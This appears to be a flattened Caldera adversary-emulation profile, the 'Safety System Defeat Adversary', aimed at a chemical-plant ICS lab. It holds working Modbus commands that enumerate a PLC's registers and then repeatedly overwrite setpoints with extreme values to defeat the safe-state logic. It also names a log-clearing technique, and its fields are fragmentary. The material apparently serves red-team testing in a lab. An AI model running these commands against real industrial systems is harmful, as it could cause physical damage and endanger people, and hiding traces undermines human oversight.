ability.technique_name: Indicator Removal on Host: Clear Command History
ability.name: Avoid logs

steps.description: Scan the ICS process network for live Modbus hosts
steps.name: Nmap ICS Subnet Discovery

steps.command: echo "=== PLC Holding Registers (Setpoints) ===" && ./modbus_cli 192.168.95.2 --port 502 read_hr 0 31 && echo "=== PLC Coils (run_bit at QX5.0 = coil 40) ===" && ./modbus_cli 192.168.95.2 --port 502 read_c 0 50 && echo "=== PLC Input Registers (process values) ===" && ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13
steps.plaintext_command: echo "=== PLC Holding Registers (Setpoints) ===" && ./modbus_cli 192.168.95.2 --port 502 read_hr 0 31 && echo "=== PLC Coils (run_bit at QX5.0 = coil 40) ===" && ./modbus_cli 192.168.95.2 --port 502 read_c 0 50 && echo "=== PLC Input Registers (process values) ===" && ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13
steps.description:
Read holding registers MW0-MW30 on the PLC's own Modbus slave
at 192.168.95.2:502 to discover setpoint values.
steps.name: Modbus - Enumerate PLC Internal Registers

steps.description: Read input registers from Tank device to observe pressure and liquid level
steps.name: Modbus - Read Tank Pressure and Level

output.stderr: 2026-04-08 15:05:17,868 INFO     Connecting to 192.168.95.14:502 over TCP2026-04-08 15:05:17,871 INFO     Read Input Registers (04) -- [Address: 1, Count: 2, Device ID: 1]2026-04-08 15:05:17,872 INFO     Disconnecting...

steps.command: for i in $(seq 1 20); do  ./modbus_cli 192.168.95.2 --port 502 write_r 0 65535;  ./modbus_cli 192.168.95.2 --port 502 write_r 2 0;  ./modbus_cli 192.168.95.2 --port 502 write_r 4 65535;  sleep 0.3;done && echo "SETPOINTS_OVERWRITTEN"
steps.plaintext_command: for i in $(seq 1 20); do  ./modbus_cli 192.168.95.2 --port 502 write_r 0 65535;  ./modbus_cli 192.168.95.2 --port 502 write_r 2 0;  ./modbus_cli 192.168.95.2 --port 502 write_r 4 65535;  sleep 0.3;done && echo "SETPOINTS_OVERWRITTEN"
steps.description:
Write dangerous setpoint values to PLC registers.
Reduced to 20 iterations to avoid Caldera timeout.
steps.name: Modbus - Overwrite PLC Setpoints

adversary.name: Safety System Defeat Adversary
adversary.description:
Targets the PLC's internal Modbus registers to overwrite setpoints
and manipulate the run_bit, defeating the built-in safe-state
mechanism of the chemical plant control program.

objectives.name: default
objectives.description: This is a default objective that runs forever.
